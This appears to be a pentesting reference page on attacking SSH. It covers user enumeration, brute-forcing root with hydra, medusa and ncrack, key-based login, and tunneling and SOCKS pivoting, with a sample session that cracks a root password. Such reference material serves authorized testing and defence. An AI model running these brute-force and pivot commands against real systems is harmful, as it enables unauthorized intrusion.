<!-- Title -->
<h1 class="text-2xl font-bold mb-2">SSH Exploitation</h1>
<p class="text-gray-300 mb-4">
  Domain: <strong>Remote Access Security</strong> • Focus: <strong>SSH Abuse & Weak Credential Exploits</strong> • Last Updated: <strong>2025-09-05</strong>
</p>

<!-- Summary -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Summary</h2>
  <p class="text-gray-300">
    SSH (Secure Shell) is the default remote administration protocol for Linux/Unix systems 
    and many network devices. While cryptographically secure, exploitation arises from weak 
    credentials, password reuse, key mismanagement, and outdated server software. Attackers 
    target SSH for brute-force access, credential reuse, lateral movement, and persistence. 
    Once compromised, SSH provides full interactive shell access and tunneling capabilities 
    for stealthy pivoting into internal networks.
  </p>
</section>

<!-- Why Exploitable -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
  <ul class="list-disc ml-5 text-gray-200 space-y-2">
    <li><strong>Weak Passwords:</strong> Common/default creds brute-forced easily.</li>
    <li><strong>Key Mismanagement:</strong> Private keys left on disk or reused insecurely.</li>
    <li><strong>Old Versions:</strong> Vulnerabilities like CVE-2018-15473 (user enum).</li>
    <li><strong>Tunneling Abuse:</strong> Port forwarding and dynamic SOCKS proxy pivoting.</li>
    <li><strong>Lack of MFA:</strong> Password-only auth increases attack success rate.</li>
  </ul>
</section>

<!-- How Exploitation Works -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li><strong>Discovery:</strong> Identify open TCP/22 with service fingerprinting.</li>
    <li><strong>User Enumeration:</strong> Test for valid usernames via timing/differences.</li>
    <li><strong>Credential Attacks:</strong> Brute-force or use stolen creds/private keys.</li>
    <li><strong>Session Compromise:</strong> Gain shell and escalate privileges.</li>
    <li><strong>Tunneling & Persistence:</strong> Use port forwarding, agent hijacking, or backdoor keys.</li>
  </ol>
</section>

<!-- Steps -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Steps</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li>Scan and fingerprint SSH service.</li>
    <li>Enumerate users (if vulnerable).</li>
    <li>Brute-force or try credential reuse.</li>
    <li>Leverage compromised access for privilege escalation.</li>
    <li>Pivot internally via SSH tunneling or agent hijacking.</li>
  </ol>
</section>

<!-- Commands -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Commands</h2>
  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">

# ------------------------------
# Discovery
# ------------------------------
nmap -p22 -sV --script ssh* [target]         # Detect SSH version and vulnerabilities

# ------------------------------
# User Enumeration (CVE-2018-15473)
# ------------------------------
nmap --script ssh-user-enum --script-args userdb=/usr/share/wordlists/users.txt [target]

# ------------------------------
# Brute Force Attacks
# ------------------------------
hydra -l root -P rockyou.txt ssh://[target]
medusa -h [target] -u admin -P wordlist.txt -M ssh
ncrack -p 22 --user root -P rockyou.txt [target]

# ------------------------------
# Private Key Authentication
# ------------------------------
ssh -i id_rsa user@[target]
ssh-add id_rsa && ssh user@[target]

# ------------------------------
# SSH Tunneling
# ------------------------------
ssh -L 8080:10.0.0.5:80 user@[target]        # Local port forward
ssh -R 8080:127.0.0.1:22 user@[target]       # Remote port forward
ssh -D 1080 user@[target]                    # Dynamic SOCKS proxy

# ------------------------------
# Example Workflow
# ------------------------------
nmap -p22 192.168.1.50 -sV
hydra -l root -P rockyou.txt ssh://192.168.1.50
ssh root@192.168.1.50
id
whoami
  </pre>
</section>

<!-- Real-World Exploitation Walkthrough -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to expand attacker session
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

[ saide ~ ]$ nmap -p22 192.168.1.50 -sV
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)

[ saide ~ ]$ hydra -l root -P rockyou.txt ssh://192.168.1.50
[22][ssh] host: 192.168.1.50   login: root   password: toor123

[ saide ~ ]$ ssh root@192.168.1.50
root@192.168.1.50's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210 x86_64)

root@server:~# id
uid=0(root) gid=0(root) groups=0(root)

[ saide ~ ]$ ssh -D 1080 root@192.168.1.50
Dynamic SOCKS proxy established at 127.0.0.1:1080
Pivoting through compromised host...
    </pre>
  </details>
</section>

<!-- Example Results -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to view sample SSH exploitation results
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

# Banner Grab
OpenSSH 7.2p2 Ubuntu 4ubuntu2.6

# Brute Force Result
root : toor123

# Shell Access
uid=0(root) gid=0(root) groups=0(root)

# Pivot Established
SOCKS proxy listening on 127.0.0.1:1080
Internal services reachable via proxychains
    </pre>
  </details>
</section>

<!-- References -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
  <h2 class="text-lg font-semibold mb-2">References</h2>
  <ul class="list-disc ml-5 text-gray-200">
    <li>
      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        HackTricks – Pentesting SSH
      </a>
    </li>
    <li>
      <a href="https://attack.mitre.org/techniques/T1021/004/" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        MITRE ATT&CK – SSH Remote Services
      </a>
    </li>
    <li>Red Team workflow: Discovery → Brute/Key abuse → Shell access → Pivot/tunneling.</li>
  </ul>
</section>
